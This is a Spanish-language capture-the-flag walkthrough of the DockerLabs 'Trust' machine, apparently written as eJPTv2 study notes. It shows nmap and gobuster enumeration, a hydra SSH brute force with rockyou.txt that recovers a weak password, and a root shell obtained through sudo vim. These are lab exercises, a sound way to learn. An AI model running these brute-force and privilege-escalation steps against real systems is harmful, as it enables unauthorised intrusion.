# Trust DockerLabs

***

## 1 - Reconocimiento

#### P1 - Verificar conectividad

```Shell
ping -c 1 172.18.0.2
```

<figure><img src="../.gitbook/assets/Trust - Conectividad.jpg" alt=""><figcaption></figcaption></figure>

#### P2 - Escaneo de puertos con nmap

```Shell
nmap -p- --open --min-rate=5000 -sS -n -Pn 172.18.0.2
```

<figure><img src="../.gitbook/assets/Trust - Escaneo de puertos.jpg" alt=""><figcaption></figcaption></figure>

## 2 - Enumeración

#### P1 - Scripts basicos de reconocimiento y versiones de los servicios

```Shell
nmap -sCV -p22,80 172.18.0.2
```

<figure><img src="../.gitbook/assets/Trust - Versiones de servicios, Scripts basicos.jpg" alt=""><figcaption></figcaption></figure>

#### P2 - Enumeración de directorios y archivos

> Vemos que tenemos el puerto 80 (http) expuesto, veamos que hay en la pagina web

<figure><img src="../.gitbook/assets/Trust - Pagina web (1).jpg" alt=""><figcaption></figcaption></figure>

> Nos encontramos con la pagina web por defecto de apache2, esto nos dice que es un servidor web apache2 recien instalado, como no hay nada en la pagina raiz veamos que hay en los demas directorios

```Shell
sudo gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.18.0.2/" -x .txt,.php,.py,.sh
```

> En este caso he usado gobuster para la enumeración de directorios, pero tambien podrias usar otra herramienta como dirbuster que es la recomendada por INE para la EJPTv2

<figure><img src="../.gitbook/assets/Trust - gobuster.jpg" alt=""><figcaption></figcaption></figure>

> Entre los directorios encontrados, el unico directorio con codigo de estado 200 (exitosa) es /secret.php , vayamos a investigar que hay en ese directorio

<figure><img src="../.gitbook/assets/Trust - Directorio secreto.jpg" alt=""><figcaption></figcaption></figure>

> Dentro del directorio nos encontramos con un potencial usuario llamado Mario que mas tarde nos puede ser de gran ayuda para entrar por SSH a la maquina

#### P3 - Enumeración del servicio SSH

```Shell
ssh Mario@172.18.0.2
```

> Al intentar acceder a la máquina víctima mediante SSH, se nos solicita una contraseña. Hemos probado varias contraseñas comunes como "admin", "root", "password", etc. Pero ninguna ha funcionado. Para optimizar este proceso en el siguiente paso probaremos un ataque de fuerza bruta con hydra

## 3 - Explotación

#### P1 - Fuerza bruta con hydra

```Shell
hydra -l Mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```

> Tras un rato esperando vemos que hydra no logra encontrarnos la contraseña correcta para el usuario Mario, asi que probemos con mario en minuscula

```Shell
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```

<figure><img src="../.gitbook/assets/Trust - Hydra.jpg" alt=""><figcaption></figcaption></figure>

> Parece que hydra nos encontró la contraseña chocolate para el usuario mario, probemoslo

<figure><img src="../.gitbook/assets/Trust - ssh.jpg" alt=""><figcaption></figcaption></figure>

> Funciono, estamos dentro de la maquina, en el siguiente paso veremos como escalar privilegios con ayuda del comando sudo -l

## 4 - Escalada de privilegios

#### P1 - Sudo -l

```Shell
sudo -l
```

> Con ayuda del comando sudo -l podemos ver qué comandos podemos ejecutar con privilegios de superusuario, en este caso nos pone que podemos utilizar vim

<figure><img src="../.gitbook/assets/Trust - sudo -l.jpg" alt=""><figcaption></figcaption></figure>

> Ahora que sabemos que podemos utilizar vim como sudo, podemos probar a abrirlo

```
sudo /usr/bin/vim
```

> Podemos aprovechar para crearnos una shell con vim usando el siguiente comando

```
:!/bin/bash
```

<figure><img src="../.gitbook/assets/Trust - Shell root.jpg" alt=""><figcaption></figcaption></figure>

> Ya somos root

***
